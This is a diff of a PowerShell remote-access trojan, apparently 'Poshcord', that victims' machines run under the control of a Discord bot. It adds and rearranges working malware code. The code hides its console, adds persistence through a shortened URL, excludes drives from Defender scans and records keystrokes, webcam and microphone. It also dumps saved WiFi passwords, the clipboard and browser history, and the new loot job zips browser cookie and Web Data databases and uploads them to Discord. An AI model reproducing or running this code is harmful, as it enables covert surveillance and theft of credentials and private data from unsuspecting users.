@@ -5,16 +5,13 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor i
 
 #>
 # =====================================================================================================================================================
-
 $global:token = "$tk" # make sure your bot is in the same server as the webhook
-
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-
 $parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
@@ -22,7 +19,6 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
     $InfoOnConnect = 0
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
-
 $version = "1.5.1" # Check version number
 $response = $null
 $previouscmd = $null
@@ -30,8 +26,6 @@ $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 
 # =============================================================== MODULE FUNCTIONS =========================================================================
-
-
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
     sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
@@ -261,33 +255,26 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | Commands List "
             "description" = @"
-- **SpeechToText**: Send audio transcript to Discord
-- **Systeminfo**: Send System info as text file to Discord
-- **FolderTree**: Save folder trees to file and send to Discord
-- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
-- **NearbyWifi**: Show nearby wifi networks (!user popup!)
-- **BrowserDB**:  Gather Database files from Chrome and send to Discord
 
+### SYSTEM
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
 - **IsAdmin**: Check if the session is admin
 - **Elevate**: Attempt to restart script as admin (!user popup!)
 - **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
 - **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
-- **EnableRDP**: Enable Remote Desktop on target.
-- **EnableIO**: Enable Keyboard and Mouse
-- **DisableIO**: Disable Keyboard and Mouse
-
-- **Microphone**: Record microphone clips and send to Discord
-- **RecordScreen**: Record Screen and send to Discord
-- **Webcam**: Stream webcam pictures to Discord
+- **EnableIO**: Enable Keyboard and Mouse (admin only)
+- **DisableIO**: Disable Keyboard and Mouse (admin only)
 - **Exfiltrate**: Send various files. (see ExtraInfo)
 - **Upload**: Upload a file. (see ExtraInfo)
 - **Download**: Download a file. (attach a file with the command)
 - **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
-- **Screenshots**: Sends screenshots of the desktop to Discord
-- **Keycapture**: Capture Keystrokes and send to Discord
+- **SpeechToText**: Send audio transcript to Discord
+- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
+- **NearbyWifi**: Show nearby wifi networks (!user popup!)
+- **RecordScreen**: Record Screen and send to Discord
 
+### PRANKS
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
 - **Windows93**: Start parody Windows93 using Chrome
 - **WindowsIdiot**: Start fake Windows95 using Chrome
@@ -298,13 +285,19 @@ $script:jsonPayload = @{
 - **MinimizeAll**: Send a voice message to the User
 - **EnableDarkMode**: Enable System wide Dark Mode
 - **DisableDarkMode**: Disable System wide Dark Mode
-- **VolumeMax**: Maximise System Volume
-- **VolumeMin**: Minimise System Volume
 - **ShortcutBomb**: Create 50 shortcuts on the desktop.
 - **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
 - **Goose**: Spawn an annoying goose (Sam Pearson App)
 - **ScreenParty**: Start A Disco on screen!
 
+### JOBS
+- **Microphone**: Record microphone clips and send to Discord
+- **Webcam**: Stream webcam pictures to Discord
+- **Screenshots**: Sends screenshots of the desktop to Discord
+- **Keycapture**: Capture Keystrokes and send to Discord
+- **SystemInfo**: Gather System Info and send to Discord
+
+### CONTROL
 - **ExtraInfo**: Get a list of further info and command examples
 - **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
 - **Kill**: Stop a running module (eg. Exfiltrate)
@@ -352,11 +345,9 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 > PS> ``wallpaper -url http://img.com/f4wc``
 
 **Record Examples:**
-> PS> ``RecordAudio -t 100`` (number of seconds to record)
 > PS> ``RecordScreen -t 100`` (number of seconds to record)
 
 **Kill Command modules:**
-- Keycapture
 - Exfiltrate
 - SendHydra
 - SpeechToText
@@ -391,19 +382,6 @@ Function CleanUp {
 }
 
 # --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
-
-Function FolderTree{
-    tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
-    tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
-    tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
-    $FilePath ="$env:temp/TreesOfKnowledge.zip"
-    Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
-    sleep 1
-    sendFile -sendfilePath $FilePath | Out-Null
-    rm -Path $FilePath -Force
-    Write-Output "Done."
-}
-
 Function EnumerateLAN{
 param ([string]$Prefix)
     if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
@@ -441,312 +419,6 @@ param ([string]$Prefix)
     rm -Path $FileOut
 }
 
-Function SystemInfo{
-sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
-Add-Type -AssemblyName System.Windows.Forms
-# WMI Classes
-$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$processorInfo = Get-WmiObject -Class Win32_Processor
-$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$videocardinfo = Get-WmiObject Win32_VideoController
-$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
-$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$processor = "$($processorInfo.Name)"
-$gpu = "$($videocardinfo.Name)"
-$DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
-$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
-# User Information
-$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = (Get-ComputerInfo).WindowsRegisteredOwner
-$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
-$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-$OSString = "$($systemInfo.Caption)"
-$OSArch = "$($systemInfo.OSArchitecture)"
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$users = "$($userInfo.Name)"
-$userString = "`nFull Name : $($userInfo.FullName)"
-$clipboard = Get-Clipboard
-# System Information
-$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
-$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
-$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
-$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
-$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
-$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
-$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
-# Nearby WiFi Networks
-$showNetworks = explorer.exe ms-availablenetworks:
-sleep 4
-$wshell = New-Object -ComObject wscript.shell
-$wshell.AppActivate('explorer.exe')
-$tab = 0
-while ($tab -lt 6){
-$wshell.SendKeys('{TAB}')
-$tab++
-}
-$wshell.SendKeys('{ENTER}')
-$wshell.SendKeys('{TAB}')
-$wshell.SendKeys('{ESC}')
-$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
-$Wifi = ($NearbyWifi|Out-String)
-# Current System Metrics
-function Get-PerformanceMetrics {
-    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
-    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
-    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
-    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
-
-    return [PSCustomObject]@{
-        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
-        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
-        DiskIO = "{0:F2}" -f $diskIO.CookedValue
-        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
-    }
-}
-$metrics = Get-PerformanceMetrics
-$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
-$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
-$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
-$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
-# History and Bookmark Data
-$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-$Paths = @{
-    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
-    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
-}
-$Browsers = @('chrome', 'edge', 'firefox', 'opera')
-$DataValues = @('history', 'bookmarks')
-$outpath = "$env:temp\Browsers.txt"
-foreach ($Browser in $Browsers) {
-    foreach ($DataValue in $DataValues) {
-        $PathKey = "${Browser}_${DataValue}"
-        $Path = $Paths[$PathKey]
-
-        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique
-
-        $Value | ForEach-Object {
-            [PSCustomObject]@{
-                Browser  = $Browser
-                DataType = $DataValue
-                Content = $_
-            }
-        } | Out-File -FilePath $outpath -Append
-    }
-}
-$Value = Get-Content -Path $outpath
-$Value = ($Value | Out-String)
-# Saved WiFi Network Info
-$outssid = ''
-$a=0
-$ws=(netsh wlan show profiles) -replace ".*:\s+"
-foreach($s in $ws){
-    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
-        $ssid=$s.Trim()
-        if($s -Match ":"){
-            $ssid=$s.Split(":")[1].Trim()
-            }
-        $pw=(netsh wlan show profiles name=$ssid key=clear)
-        $pass="None"
-        foreach($p in $pw){
-            if($p -Match "Key Content"){
-            $pass=$p.Split(":")[1].Trim()
-            $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
-            }
-        }
-    }
-    $a++
-}
-# GPS Location Info
-Add-Type -AssemblyName System.Device
-$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
-$GeoWatcher.Start()
-while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-	Sleep -M 100
-}  
-if ($GeoWatcher.Permission -eq 'Denied'){
-    $GPS = "Location Services Off"
-}
-else{
-	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
-	$GL = $GL -split " "
-	$Lat = $GL[0].Substring(11) -replace ".$"
-	$Lon = $GL[1].Substring(10) -replace ".$"
-    $GPS = "LAT = $Lat LONG = $Lon"
-}
-
-function EnumNotepad{
-$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
-$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
-$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
-foreach ($dir in $matchingDirectories) {
-    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
-    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
-    foreach ($fullFilePath in $listOfBinFiles) {
-        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
-            continue
-        }
-        $seperator = ("=" * 60)
-        $SMseperator = ("-" * 60)
-        $seperator | Out-File -FilePath $outpath -Append
-        $filename = $fullFilePath.Name
-        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
-        $isSavedFile = $contents[3]
-        if ($isSavedFile -eq 1) {
-            $lengthOfFilename = $contents[4]
-            $filenameEnding = 5 + $lengthOfFilename * 2
-            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
-            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
-            $filename | Out-File -FilePath $outpath -Append
-            $SMseperator | Out-File -FilePath $outpath -Append
-            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
-
-        } else {
-            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
-            $filename | Out-File -FilePath $outpath -Append
-            $SMseperator | Out-File -FilePath $outpath -Append
-            $filenameEnding = 0
-            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
-            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
-            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
-            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
-            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
-            $originalFileContent = ""
-            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
-                if ($originalFileBytes[$i] -ne 0) {
-                    $originalFileContent += [char]$originalFileBytes[$i]
-                }
-            }
-            $originalFileContent | Out-File -FilePath $outpath -Append
-        }
-     "`n" | Out-File -FilePath $outpath -Append
-    }
-}
-}
-
-$infomessage = "
-==================================================================================================================================
-      _________               __                           .__        _____                            __  .__               
-     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
-     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
-     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
-    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
-            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
-==================================================================================================================================
-"
-$infomessage1 = "``````
-=============================================================
-SYSTEM INFORMATION FOR $env:COMPUTERNAME
-=============================================================
-User Information
--------------------------------------------------------------
-Current User          : $env:USERNAME
-Email Address         : $email
-Language              : $systemLanguage
-Keyboard Layout       : $keyboardLayoutID
-Other Accounts        : $users
-Current OS            : $OSString
-Build ID              : $ver
-Architechture         : $OSArch
-Screen Size           : $screensize
-Location              : $GPS
-=============================================================
-Hardware Information
--------------------------------------------------------------
-Processor             : $processor 
-Memory                : $RamInfo
-Gpu                   : $gpu
-
-Storage
-----------------------------------------
-$Hddinfo
-$DiskHealth
-Current System Metrics
-----------------------------------------
-$PMcpu
-$PMmu
-$PMdio
-$PMnio
-=============================================================
-Network Information
--------------------------------------------------------------
-Public IP Address     : $computerPubIP
-``````"
-$infomessage2 = "
-
-Saved WiFi Networks
-----------------------------------------
-$outssid
-
-Nearby Wifi Networks
-----------------------------------------
-$Wifi
-==================================================================================================================================
-History Information
-----------------------------------------------------------------------------------------------------------------------------------
-Clipboard Contents
----------------------------------------
-$clipboard
-
-Browser History
-----------------------------------------
-$Value
-
-Powershell History
----------------------------------------
-$pshistory
-
-==================================================================================================================================
-Recent File Changes Information
-----------------------------------------------------------------------------------------------------------------------------------
-$RecentFiles
-
-==================================================================================================================================
-USB Information
-----------------------------------------------------------------------------------------------------------------------------------
-$usbdevices
-
-==================================================================================================================================
-Software Information
-----------------------------------------------------------------------------------------------------------------------------------
-$software
-
-==================================================================================================================================
-Running Services Information
-----------------------------------------------------------------------------------------------------------------------------------
-$service
-
-==================================================================================================================================
-Current Processes Information
-----------------------------------------------------------------------------------------------------------------------------------
-$process
-
-=================================================================================================================================="
-$outpath = "$env:TEMP/systeminfo.txt"
-$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
-$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
-$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
-
-if ($OSString -like '*11*'){
-    EnumNotepad
-}
-else{
-    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
-}
-
-sendMsg -Message $infomessage1
-sendFile -sendfilePath $outpath
-Sleep 1
-Remove-Item -Path $outpath -force
-}
-
 Function NearbyWifi {
     $showNetworks = explorer.exe ms-availablenetworks:
     sleep 4
@@ -766,51 +438,6 @@ Function NearbyWifi {
     $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
     $Wifi = ($NearbyWifi|Out-String)
     sendMsg -Message "``````$Wifi``````"
-}
-
-Function BrowserDB {
-
-    sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
-    $temp = [System.IO.Path]::GetTempPath() 
-    $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
-    $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
-    $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
-    $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
-    New-Item -Path $tempFolder -ItemType Directory -Force
-    sleep 1
-    New-Item -Path $googledest -ItemType Directory -Force
-    New-Item -Path $mozdest -ItemType Directory -Force
-    New-Item -Path $edgedest -ItemType Directory -Force
-    sleep 1
-    
-    Function CopyFiles {
-        param ([string]$dbfile,[string]$folder,[switch]$db)
-        $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite'}
-        foreach ($file in $filesToCopy) {
-            $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-            if ($db -eq $true){
-                $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
-            }
-            else{
-                $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
-            }
-            $destination = Join-Path -Path $folder -ChildPath $newFileName
-            Copy-Item -Path $file.FullName -Destination $destination -Force
-        }
-    } 
-    
-    $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
-    $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' };$firefoxDir = $firefoxDir.FullName
-    $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
-    copyFiles -dbfile $googleDir -folder $googledest -db
-    copyFiles -dbfile $firefoxDir -folder $mozdest
-    copyFiles -dbfile $edgeDir -folder $edgedest -db
-    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
-    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
-    Remove-Item -Path $tempFolder -Recurse -Force
-    sendFile -sendfilePath $zipFileName
-    sleep 1
-    Remove-Item -Path $zipFileName -Recurse -Force
 }
 
 # --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------
@@ -934,16 +561,6 @@ Function DisableDarkMode {
     Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
     Start-Sleep 1
     sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
-}
-
-Function VolumeMax {
-    Start-AudioControl
-    [audio]::Volume = 1
-}
-
-Function VolumeMin {
-    Start-AudioControl
-    [audio]::Volume = 0
 }
 
 Function ShortcutBomb {
@@ -1218,6 +835,364 @@ Function DisableIO{
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
+# Scriptblock for info + loot to discord
+$dolootjob = {
+param([string]$token,[string]$LootID)
+    function sendFile {
+        param([string]$sendfilePath)
+    
+        $url = "https://discord.com/api/v10/channels/$LootID/messages"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("Authorization", "Bot $token")
+        if ($sendfilePath) {
+            if (Test-Path $sendfilePath -PathType Leaf) {
+                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
+                Write-Host "Attachment sent to Discord: $sendfilePath"
+            } else {
+                Write-Host "File not found: $sendfilePath"
+            }
+        }
+    }
+
+    function sendMsg {
+        param([string]$Message)
+        $url = "https://discord.com/api/v10/channels/$lootID/messages"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
+        if ($Message) {
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$env:computername"
+            } | ConvertTo-Json
+            $wc.Headers.Add("Content-Type", "application/json")
+            $response = $wc.UploadString($url, "POST", $jsonBody)
+	        $message = $null
+        }
+    }
+
+    Function BrowserDB {
+        sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
+        $temp = [System.IO.Path]::GetTempPath() 
+        $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
+        $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
+        $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
+        $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
+        New-Item -Path $tempFolder -ItemType Directory -Force
+        sleep 1
+        New-Item -Path $googledest -ItemType Directory -Force
+        New-Item -Path $mozdest -ItemType Directory -Force
+        New-Item -Path $edgedest -ItemType Directory -Force
+        sleep 1
+        
+        Function CopyFiles {
+            param ([string]$dbfile,[string]$folder,[switch]$db)
+            $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite'}
+            foreach ($file in $filesToCopy) {
+                $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+                if ($db -eq $true){
+                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
+                }
+                else{
+                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
+                }
+                $destination = Join-Path -Path $folder -ChildPath $newFileName
+                Copy-Item -Path $file.FullName -Destination $destination -Force
+            }
+        } 
+        
+        $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+        $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' };$firefoxDir = $firefoxDir.FullName
+        $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
+        copyFiles -dbfile $googleDir -folder $googledest -db
+        copyFiles -dbfile $firefoxDir -folder $mozdest
+        copyFiles -dbfile $edgeDir -folder $edgedest -db
+        $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
+        Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
+        Remove-Item -Path $tempFolder -Recurse -Force
+        sendFile -sendfilePath $zipFileName
+        sleep 1
+        Remove-Item -Path $zipFileName -Recurse -Force
+    }
+
+    Function SystemInfo{
+    sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
+    Add-Type -AssemblyName System.Windows.Forms
+    # WMI Classes
+    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+    $userInfo = Get-WmiObject -Class Win32_UserAccount
+    $processorInfo = Get-WmiObject -Class Win32_Processor
+    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
+    $userInfo = Get-WmiObject -Class Win32_UserAccount
+    $videocardinfo = Get-WmiObject Win32_VideoController
+    $Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
+    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+    $processor = "$($processorInfo.Name)"
+    $gpu = "$($videocardinfo.Name)"
+    $DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
+    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
+    # User Information
+    $fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
+    $email = (Get-ComputerInfo).WindowsRegisteredOwner
+    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
+    $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
+    $OSString = "$($systemInfo.Caption)"
+    $OSArch = "$($systemInfo.OSArchitecture)"
+    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    $users = "$($userInfo.Name)"
+    $userString = "`nFull Name : $($userInfo.FullName)"
+    $clipboard = Get-Clipboard
+    # System Information
+    $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
+    $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
+    $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
+    $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
+    $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
